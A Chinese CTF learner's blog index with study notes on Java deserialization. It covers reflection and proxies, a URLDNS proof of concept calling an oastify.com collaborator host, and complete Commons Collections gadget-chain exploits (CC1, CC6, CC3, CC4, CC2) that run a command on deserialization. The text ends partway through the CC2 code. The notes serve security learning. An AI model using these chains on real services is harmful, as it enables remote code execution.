{"pages":[{"title":"","text":"about me Whoami : zIxyd Contact : Mjk3MjkxNDY5Mg== Dream : 重生之我要当大黑阔 Age : 19 CTF: WEB/PWN Skill : 精通 Python/Java/C/C++/PHP/JavaScript的Hello World","link":"/about/index.html"},{"title":"","text":"","link":"/links/index.html"}],"posts":[{"title":"Java反序列化基础","text":"重写readObject来执行命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546//Studentpackage test;import java.io.IOException;import java.io.Serializable;public class Student implements Serializable { public String name; public int age; public Student() { } public Student(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; }// @Override public String toString() { // 返回对象的字符串表示 return &quot;Student{&quot; + &quot;name='&quot; + name + '\\'' + &quot;, age=&quot; + age + '}'; } //重写readObject private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec(&quot;calc.exe&quot;); }} 1234567891011121314151617//Serializepackage test;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class abc { public static void main(String[] args) throws IOException { Student stu = new Student(&quot;lisi&quot;,18); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;a.txt&quot;)); oos.writeObject(stu); System.out.println(stu); oos.close(); }} 1234567891011121314151617181920//Unserializepackage test;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class unseralize { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;a.txt&quot;)); Object o = ois.readObject(); System.out.println(o); ois.close(); }} Java(反射基础)Java反射是指在运行时动态地获取、检查和操作类的信息的机制。它允许程序在运行时通过类的名称来获取类的详细信息，包括类的构造函数、方法、字段等，并且可以在运行时动态地创建对象、调用方法和访问字段。反射机制使得程序可以在编译时无法确定具体类的情况下，通过名称来操作类，从而提供了更大的灵活性和动态性。 反射获取class对象1234567891011121314151617181920public class test01 { public static void main(String[] args) throws ClassNotFoundException { /* 获取class对象的三种方式 Class.forName(&quot;全类名&quot;) 全类名：包名+类名 类名.class 对象。getClass() */ Class clazz01 = Class.forName(&quot;Student&quot;); System.out.println(clazz01); Class clazz02 = Student.class; System.out.println(clazz02); Student s = new Student(); Class clazz03 = s.getClass(); System.out.println(clazz03); }} 反射获取构造方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Parameter;public class test01 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException { /* Class类中用于获取构造方法的方法 Class类中用于获取构造方法的方法 Constructor&lt;?&gt;[]getConstructors():返回所有公共构造方法对象的数组 Constructor&lt;?&gt;[]getDeclaredConstructors():返回所有构造方法对象的数组 Constructor&lt;T&gt;getConstructor(Class&lt;?&gt;…parameterTypes):返回单个公共构造方法对象 Constructor&lt;-T&gt;getDeclaredConstructor((Class&lt;?&gt;parameterTypes):返回单个构造方法对象 */ //获取Class字节码文件对象 Class clazz = Class.forName(&quot;Student&quot;); System.out.println(&quot;获取所有构造方法&quot;); Constructor[] con = clazz.getDeclaredConstructors(); for (Constructor constructor : con) { System.out.println(constructor.toString()); } System.out.println(&quot;获取无参的构造方法&quot;); Constructor con1 = clazz.getConstructor(); System.out.println(con1); System.out.println(&quot;获取参数为String类型的构造方法&quot;); Constructor con2 = clazz.getDeclaredConstructor(String.class); System.out.println(con2); System.out.println(&quot;获取参数为int类型的构造方法&quot;); Constructor con3 = clazz.getDeclaredConstructor(int.class); System.out.println(con3); System.out.println(&quot;获取参数为Sting类型和int类型的构造方法&quot;); Constructor con4 = clazz.getDeclaredConstructor(String.class,int.class); System.out.println(con4); System.out.println(&quot;获取构造方法的权限修饰符&quot;); /* public : 1 protected : 4 private : 2 */ int modifiers = con4.getModifiers(); System.out.println(modifiers); System.out.println(&quot;获取构造方法的参数&quot;); Parameter[] parameters = con4.getParameters(); for(Parameter parameter : parameters){ System.out.println(parameter); } System.out.println(&quot;创建对象&quot;); con4.setAccessible(true); Object stu = con4.newInstance(&quot;张三&quot;, 18); System.out.println(stu); }} 反射获取成员变量1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.lang.reflect.Field;public class test02 { public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException { /* Field[] getFields():返回所有公共成员变量对象的数组 Field[] getDeclaredFields():返回所有成员变量对象的数组 Field getField(String name):返回单个公共成员变量对象 Field getDeclaredField(String name):返回单个成员变量对象 */ System.out.println(&quot;获取class字节码文件对象&quot;); Class clazz = Class.forName(&quot;Student&quot;); System.out.println(&quot;获取所有成员变量对象&quot;); Field[] fields = clazz.getDeclaredFields(); for (Field field :fields){ System.out.println(field); } System.out.println(&quot;获取name成员变量&quot;); Field name = clazz.getDeclaredField(&quot;name&quot;); System.out.println(name); System.out.println(&quot;获取权限修饰符&quot;); int modifiers = name.getModifiers(); System.out.println(modifiers); System.out.println(&quot;获取Name&quot;); String n = name.getName(); System.out.println(n); System.out.println(&quot;获取成员变量记录的值&quot;); Student s = new Student(&quot;李四&quot;,18,&quot;男&quot;); name.setAccessible(true); Object value = name.get(s); System.out.println(value); System.out.println(&quot;修改成员变量记录的值&quot;); name.set(s,&quot;张三&quot;); Object value2 = name.get(s); System.out.println(value2); }} URLDNSpoc1234567891011121314151617181920212223242526272829303132import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.MalformedURLException;import java.net.URL;import java.util.HashMap;public class Serialize { public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException { HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;URL, Integer&gt;(); URL url = new URL(&quot;http://9t3yg0l28pe8p1dypavjbhwf66cx0o1cq.oastify.com&quot;); Class c = url.getClass(); Field hashcodefield = c.getDeclaredField(&quot;hashCode&quot;); hashcodefield.setAccessible(true); hashcodefield.set(url,2); //在hashmap.put中调用了putVal() hashmap.put(url, 1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;a.bin&quot;)); hashcodefield.set(url,-1); oos.writeObject(hashmap); oos.close(); }} 12345678910111213import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.IOException;import java.io.ObjectInputStream;public class unSerialize { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;)); ois.readObject(); ois.close(); }} pop gadget12345Gadget Chain: HashMap.readObject() HashMap.putVal() HashMap.hash() URL.hashCode() 可以理解为, 在序列化 HashMap 类的对象时, 为了减小序列化后的大小, 并没有将整个哈希表保存进去, 而是仅仅保存了所有内部存储的 key 和 value. 所以在反序列化时, 需要重新计算所有 key 的 hash, 然后与 value 一起放入哈希表中. 而恰好, URL 这个对象计算 hash 的过程中用了 getHostAddress 查询了 URL 的主机地址, 自然需要发出 DNS 请求. 我在学习URLDNS中遇到一个问题：尽管我setAccessible(true);还是会报错： Unable to make field private int java.net.URL.hashCode accessible: module java.base does not “opens java.net” to unnamed module @5b480cf9,解决方法：更换jdk版本到1.8 动态代理在Java中，动态代理是一种机制，它允许在运行时创建代理对象，以代替原始对象执行特定的操作。代理对象可以拦截对原始对象的方法调用，并在调用前后执行额外的逻辑。 在Java中，动态代理是通过java.lang.reflect.Proxy类和java.lang.reflect.InvocationHandler接口来实现的。Proxy类提供了创建代理对象的静态方法，而InvocationHandler接口定义了代理对象的方法调用处理逻辑。 一个简单的案例 创建要被代理的class123456789101112131415161718192021222324252627282930public class BigStart implements Star{ private String name; public BigStart() { } public BigStart(String name) { this.name = name; } public String getName() { return name; } public void setName(String name) { this.name = name; } public String sing(String name){ System.out.println(this.name+&quot;正在唱&quot;+name); return &quot;谢谢&quot;; } public void dance(){ System.out.println(this.name+&quot;正在跳舞&quot;); }} 创建接口12345678public interface Star { //可以把想要被代理的方法放到接口当中 public abstract String sing(String name); public abstract void dance();} 创建代理1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class ProxyuUtil { /* 方法的作用： 给明星创建代理 形参： 被代理的明星 需求： 外面的人想要大明星唱一首歌 1.获取代理的对象 代理对象=ProxyUtil,createProxy(大明星的对象)； 2,再调用代理的唱歌方法 代理对象.唱歌的方法()； */ public static Star createProxy(BigStart bigStart) { /* public static object newProxyInstance(ClassLoader loader,Class&lt;?&gt;[]interfaces,InvocationHandler h) 参数一：用于指定用哪个类加载器，去加载生成的代理类 参数二：指定接口，这些接口用于指定生成的代理长什么，也就是有哪些方法 参数三：用来指定生成的代理对象要干什么事情 */ Star star = (Star) Proxy.newProxyInstance( ProxyuUtil.class.getClassLoader(), new Class[]{Star.class}, new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { /* 参数一：代理的对象 参数二：要运行的方法 参数三：调用方法时，要传输的形参 */ if(&quot;sign&quot;.equals(method.getName())){ System.out.println(&quot;准备话筒&quot;); } else if(&quot;dance&quot;.equals(method.getName())){ System.out.println(&quot;准备场地&quot;); } return method.invoke(bigStart,args); } } ); return star; }} 测试代理123456789101112131415161718192021public class test { public static void main(String[] args) { //1. 获取代理对象 BigStart bigStart = new BigStart(&quot;鸡哥&quot;); Star proxy = ProxyuUtil.createProxy(bigStart); //2. 调用唱歌的方法 String result = proxy.sing(&quot;鸡你太美&quot;); System.out.println(result); //3. 调用跳舞的方法 proxy.dance(); }}//输出如下：//鸡哥正在唱鸡你太美//谢谢//准备场地//鸡哥正在跳舞","link":"/2023/11/01/java(unserialize)/"},{"title":"Java_CommonsCollections","text":"前言这些是从白日梦组长视频中学习到的Java反序列化，在java反序列化中一些链是可以通用的，因为每一个可以利用的节点都是独立的，所以做题的时候，甚至可以看情况直接复制粘贴，我对于java反序列化的感觉就是：不同类的同名方法 CommonsCollections1POPgadget_CheckSetValue1234567891011121314151617Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() AbstractInputCheckedMapDecorator.setValue TransformedMap.decorate TransformedMap.checkSetValue ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import com.sun.javafx.collections.MappingChange;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class Cc1Test { public static void main(String[] args) throws Exception { //============================================================================================================// Runtime.getRuntime().exec(&quot;calc&quot;);//============================================================================================================// Runtime r = Runtime.getRuntime();// new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}).transform(r);//============================================================================================================// Runtime r = Runtime.getRuntime();// InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;});// Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();// map.put(&quot;Key&quot;,&quot;Value&quot;);// Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer);// for (Map.Entry entry:transformedMap.entrySet()){// entry.setValue(r);// }//============================================================================================================// Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);// Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);// annotationInvocationHandlerConstructor.setAccessible(true);// Object shell = annotationInvocationHandlerConstructor.newInstance(Override.class,transformedMap);//============================================================================================================ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;value&quot;,&quot;deadbeef&quot;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer); Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); annotationInvocationHandlerConstructor.setAccessible(true); Object shell = annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap); serialize(shell); unserialize(shell); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize(Object obj) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} POPgadget_LazyMap关键点在 this.memberValues.entrySet(), 那么问题来了, 这里又跟 invoke 有什么关系呢. 这里涉及到 java 的动态代理机制, 这里不再赘述, 可以理解为调用这个方法实际上调用的是代理的 invoke, 在上面可以看到 AnnotationInvocationHandler 本身继承了 InvocationHandler 且重写了 invoke 方法. 刚好可以拿来利用, 1234567891011121314151617Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class CC1_lazymap { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); annotationInvocationHandlerConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap); Map mymap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object shell = annotationInvocationHandlerConstructor.newInstance(Override.class,mymap); serialize(shell); unserialize(shell); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize(Object obj) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} CommonsCollections6其实这条链不复杂，只是写的比较详细，CC6的优点:不限制CC库，不限制jdk版本，简单，但是依赖cc库。 1234567891011121314151617Gadget chain: ObjectInputStream.readObject() HashMap.readObject() HashMap.hash() TiedMapEntry.hashCode() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class CC6 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;deadbeef&quot;); HashMap hashMap = new HashMap&lt;&gt;(); hashMap.put(tiedMapEntry,&quot;deadbeef&quot;); lazyMap.remove(&quot;deadbeef&quot;); Class c = LazyMap.class; Field factoryfield = c.getDeclaredField(&quot;factory&quot;); factoryfield.setAccessible(true); factoryfield.set(lazyMap,chainedTransformer); serialize(hashMap);// unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize(Object obj) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} CommonsCollections3类的动态加载基础123456789101112import java.io.IOException;public class test { static { try { Runtime.getRuntime().exec(&quot;calc&quot;); } catch (IOException e) { throw new RuntimeException(e); } }} 12345678910111213141516171819202122232425262728293031import java.lang.reflect.Method;import java.net.MalformedURLException;import java.net.URL;import java.net.URLClassLoader;import java.nio.file.Files;import java.nio.file.Paths;public class CC3 { public static void main(String[] args) throws Exception {//=================================================================================================// ClassLoader cl = ClassLoader.getSystemClassLoader();// Class&lt;?&gt; p = cl.loadClass(&quot;Person&quot;);//=================================================================================================//file可以用http协议和jar协议代替// URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(&quot;file:///D:\\\\Dveloptools\\\\Java_Serialize\\\\out\\\\production\\\\CC1\\\\&quot;)});// Class&lt;?&gt; test = urlClassLoader.loadClass(&quot;test&quot;);// test.newInstance();//================================================================================================= ClassLoader cl = ClassLoader.getSystemClassLoader(); Method declaredMethod = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;,String.class, byte[].class, int.class, int.class); declaredMethod.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get((&quot;D:\\\\Dveloptools\\\\Java_Serialize\\\\out\\\\production\\\\CC1\\\\test.class&quot;))); Class c= (Class) declaredMethod.invoke(cl,&quot;test&quot;,code,0,code.length); c.newInstance(); }} POPgadget11234567891011121314151617181920212223242526272829import java.io.IOException;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;//抽象类public class test extends AbstractTranslet { static { try { Runtime.getRuntime().exec(&quot;calc&quot;); } catch (IOException e) { throw new RuntimeException(e); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class CC3 { public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField =tc.getDeclaredField(&quot;_name&quot;); nameField.setAccessible(true); nameField.set(templates,&quot;deadbeef&quot;); Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get((&quot;D:\\\\Dveloptools\\\\Java_Serialize\\\\out\\\\production\\\\CC1\\\\test.class&quot;))); byte[][] codes = {code}; bytecodesField.set(templates,codes); //这里直接调用需要赋值；但是反序列化不用，因为在TemplatesImpl中的readObject已经默认给_tfactory赋值了// Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);// tfactoryField.setAccessible(true);// tfactoryField.set(templates,new TransformerFactoryImpl());// templates.newTransformer();//===================================================================================== Transformer[] transformers = new Transformer[]{ new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;,null,null) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);// chainedTransformer.transform(1);//===================================================================================== Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;value&quot;,&quot;deadbeef&quot;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer); Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); annotationInvocationHandlerConstructor.setAccessible(true); Object shell = annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap); serialize(shell); unserialize(shell); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize(Object obj) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} POPgadget2 InstantiateTransformer 能替换 InvokerTransformer 的原因是内置类 com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.map.TransformedMap;import javax.xml.transform.Templates;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class CC3 { public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField =tc.getDeclaredField(&quot;_name&quot;); nameField.setAccessible(true); nameField.set(templates,&quot;deadbeef&quot;); Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get((&quot;D:\\\\Dveloptools\\\\Java_Serialize\\\\out\\\\production\\\\CC1\\\\test.class&quot;))); byte[][] codes = {code}; bytecodesField.set(templates,codes); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;value&quot;,&quot;deadbeef&quot;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer); Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); annotationInvocationHandlerConstructor.setAccessible(true); Object shell = annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap); serialize(shell);// unserialize(shell); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize(Object obj) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} CommonsCollections4换汤不换药，因为在commons-collections4-4.0.jar中TransformingComparator有了Serializable接口，所以就多了一种入口的方法， cc4和cc2和urldns那条链一样，需要改一些值避免在序列化时就调用了命令，在这里priorityQueue.add(1);就会调用命令 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CC4{ public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(&quot;_name&quot;); nameField.setAccessible(true); nameField.set(templates, &quot;deadbeef&quot;); Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get((&quot;D:\\\\Dveloptools\\\\Java_Serialize\\\\out\\\\production\\\\CC1\\\\test.class&quot;))); byte[][] codes = {code}; bytecodesField.set(templates, codes); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(1); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(&quot;transformer&quot;); transformerField.setAccessible(true); transformerField.set(transformingComparator,chainedTransformer); serialize(priorityQueue);// unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize(Object obj) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} CommonsCollections2前半部分基本上和cc4一样，就是可以不用 ChainedTransformer达到反序列化的效果，后半部分的链和cc3的pop1一样 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CC2 { public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(&quot;_name&quot;); nameField.setAccessible(true); nameField.set(templates, &quot;deadbeef&quot;); Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get((&quot;D:\\\\Dveloptools\\\\Java_Serialize\\\\out\\\\production\\\\CC1\\\\test.class&quot;))); byte[][] codes = {code}; bytecodesField.set(templates, codes); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]{}, new Object[]{}); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(templates); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(&quot;transformer&quot;); transformerField.setAccessible(true); transformerField.set(transformingComparator,invokerTransformer); serialize(priorityQueue); unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } 